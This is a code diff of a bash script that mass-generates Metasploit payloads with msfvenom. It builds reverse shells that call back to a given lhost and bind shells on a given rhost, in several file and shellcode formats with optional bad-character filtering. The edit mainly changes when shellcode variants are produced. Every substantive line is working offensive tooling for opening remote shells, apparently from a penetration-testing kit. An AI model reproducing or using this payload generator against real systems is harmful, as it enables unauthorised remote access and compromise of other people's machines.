@@ -116,11 +116,19 @@ case $platform in
 		echo -e "${RED}$platform/$rshell${NC}"
 		msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;
 
-		  if [[ -z "$bc" ]];then
-			msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode
-                 else
-                        msfvenom -p $platform/$rshell lhost=$2 lport=$3 -b $badChars -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode-badchars
-                 fi
+                  if [[ -z "$formatShellcode" ]];then
+                  continue
+
+                  else
+
+
+			  if [[ -z "$bc" ]];then
+				msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode
+                    	 else
+	                        msfvenom -p $platform/$rshell lhost=$2 lport=$3 -b $badChars -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode-badchars
+	                 fi
+
+                  fi
 
 	done
 
@@ -130,13 +138,19 @@ case $platform in
 		echo -e "${RED}$platform/$bshell${NC}"
 		msfvenom -p $platform/$bshell rhost=$1 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;
 
-		  if [[ ! -z "$bc" ]];then
-			msfvenom -p $platform/$bshell rhost=$1 lport=$3 -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode
-                 else
-			msfvenom -p $platform/$bshell rhost=$1 lport=$3 -b $badChars -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode-badchars
-                 fi
+                  if [[ -z "$formatShellcode" ]];then
+                continue
+
+                else
 
 
+			  if [[ -z "$bc" ]];then
+				msfvenom -p $platform/$bshell rhost=$1 lport=$3 -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode
+	                 else
+				msfvenom -p $platform/$bshell rhost=$1 lport=$3 -b $badChars -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode-badchars
+	                 fi
+
+                fi
 	done;;
 
 
@@ -144,4 +158,13 @@ case $platform in
 esac
 fi
 
+# delete empty files
+#for file in $(ls msfexploits);do
+#if [ -s msfexploits/$file ]
+#then
+#echo yes
+#else
+#echo no && rm -rf msfexploits/$file
+#fi
+#done
 
